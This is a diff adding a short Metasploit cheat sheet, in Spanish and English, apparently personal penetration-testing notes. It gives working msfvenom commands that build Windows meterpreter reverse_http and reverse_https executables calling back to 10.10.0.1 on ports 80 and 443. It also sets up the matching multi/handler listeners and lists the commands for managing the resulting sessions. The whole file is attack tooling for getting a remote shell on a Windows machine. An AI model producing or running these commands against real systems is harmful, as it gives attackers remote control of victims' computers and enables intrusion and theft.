@@ -1,0 +1,46 @@
+# Generación del Payload (HTTP) 
+msfvenom -p windows/meterpreter/reverse_http LHOST=10.10.0.1 LPORT=80 -f exe -o payload.exe
+
+# Generación del Payload (HTTPS) 
+msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.0.1 LPORT=443 -f exe -o payload.exe
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+# MSFconsole (Listener) (HTTP)
+use exploit/multi/handler [TYPE]
+set payload windows/meterpreter/reverse_http [PAYLOAD]
+set LHOST 10.10.0.1 [IP_ADDRESS]
+set LPORT 80 [PORT]
+exploit -j [RUN MULTIPLE PAYLOADS IN BACKGROUND]
+
+# MeterpreterSession
+
+sessions -l [LIST SESSIONS]
+sessions -i [SESSION NUMBER]
+sessions -K [KILL SESSION]
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+# MSFconsole (Listener) (HTTPS)
+use exploit/multi/handler [TYPE]
+set payload windows/meterpreter/reverse_https [PAYLOAD]
+set LHOST 10.10.0.1 [IP_ADDRESS]
+set LPORT 443 [PORT]
+exploit -j [RUN MULTIPLE PAYLOADS IN BACKGROUND]
+
+# MeterpreterSession
+
+sessions -l [LIST SESSIONS]
+sessions -i [SESSION NUMBER]
+sessions -K [KILL SESSION]
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+# Meterpreter Commands (HTTP/HTTPS Session Control)
+
+sessions -l → Lista sesiones activas.
+sessions -i <id> → Interactúa con una sesión.
+background → Envía sesión a segundo plano.
+exit → Cierra la sesión.
